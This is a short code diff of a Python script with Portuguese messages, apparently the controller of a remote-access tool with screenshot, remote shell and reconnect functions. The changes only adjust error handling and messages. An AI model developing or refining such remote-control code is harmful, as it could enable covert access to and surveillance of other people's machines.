@@ -122,7 +122,7 @@ def screenshot(s):
         f.close()
         print('Screenshot salvo na sua area de trabalho')
     else:
-        print('error continuando')
+        raise socket.error
 
 
 def shell(s):
@@ -135,7 +135,7 @@ def shell(s):
                 break
             retorno = s.recv(500000)
             if(not retorno):
-                print('maquina desconectada, tentando reconexão ...')
+                print('maquina desconectada, reconectando ...')
                 conecta('')
             else:
                 print(retorno)
@@ -196,7 +196,7 @@ def conecta(meuIP):
                     enviado = True
                     break
                 else:
-                    print('Erro: '+ str(e))
+                    enviado = True
                     break
 
 if __name__ == '__main__':
